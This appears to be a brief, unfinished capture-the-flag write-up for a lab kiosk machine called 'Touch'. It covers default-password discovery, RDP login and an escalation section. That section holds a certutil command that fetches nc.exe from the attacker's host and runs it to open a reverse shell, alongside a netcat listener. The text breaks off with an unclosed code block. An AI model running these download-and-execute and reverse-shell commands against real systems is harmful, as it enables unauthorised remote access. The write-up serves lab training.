**Touch**
*In the Layover machine, you uncovered a name and a booking confirmation code. Maybe they'll come in handy here? Jenny Crawford / KS7X2M*


# Difficulty
*Easy*


# Enumeration
<img width="1635" height="438" alt="image" src="https://github.com/user-attachments/assets/06e5ea06-0680-4e13-a7d3-5e8de0b95d55" />


# FootHold

<img width="1901" height="429" alt="Untitled" src="https://github.com/user-attachments/assets/d9a82493-437a-4850-8a18-56426fdc1885" />
from the above code we find that the default password is the device name.
<img width="1887" height="432" alt="image" src="https://github.com/user-attachments/assets/ef902dae-c09b-4a5e-b21b-d17994daba19" />
Using that information we look for an API.
<img width="978" height="190" alt="status" src="https://github.com/user-attachments/assets/1bbcf004-f44a-4256-94f8-62b04bc477a9" />
We see that there is an API so we run the a status check. We find the device serial name to get the password 

From here we are able to log in. 
<img width="1911" height="554" alt="image" src="https://github.com/user-attachments/assets/cb810f14-dd36-4477-a5bc-a4832eadd75b" />

With a username and password we can now RDP into the system
xfreerdp /v:{TARGET_IP} /u:KioskUser /p:’K!0sk2026#’ /cert:ignore


From here following the prompts, we enter in KS7X2M and Crawford as the last name. we get to the scan prompt 
<img width="979" height="661" alt="image" src="https://github.com/user-attachments/assets/42a35ec6-1a8b-4d1c-aec2-b1467fba50bf" />
It does not scan, so we go back to the API to see if they have a api scan. ensure you run the following command when you are still in the session and ran the scan passport button at least once. 
<img width="824" height="67" alt="image" src="https://github.com/user-attachments/assets/e7e8d40c-9b4a-4b2c-acf6-2e9dbc0c0ca3" />

This produces nothing so we try to break it and see what happens. Seeing as the passport scanner is the isue on the dashboard we turn it off.

We get the following
<img width="990" height="630" alt="image" src="https://github.com/user-attachments/assets/c1f0244f-b949-4ab4-a059-4b0f1f75f7df" />
Clicking on the link we get a web page that we can now treverse through the system to find the user flag.

# Privilege Esclation

From here we then try to see if we can use our kali box to create esclated privilege.

on the attack box
```
cd /tmp
cp /usr/share/windows-resources/binaries/nc.exe
python3 -m http.server 1234
```

Then setting up a listener on my attack box 
nc -lnvp 4444

back on the box we run the following command
```
certutil -urlcache -split -f http://{tun0_IP}:{PORT}/nc.exe n.exe && n.exe -e cmd.exe {tun0_IP} {PORT}

poking around we find the backend folder and an interesting file with bytes being index.ts
<img width="761" height="724" alt="image" src="https://github.com/user-attachments/assets/b0d1d61b-d42f-4182-9781-b0000efe6964" />

We see a MySQL server is running.
Running the following command we see the folling ports open.
<img width="732" height="133" alt="image" src="https://github.com/user-attachments/assets/b724532f-818c-4674-a1e4-09e89455351e" />










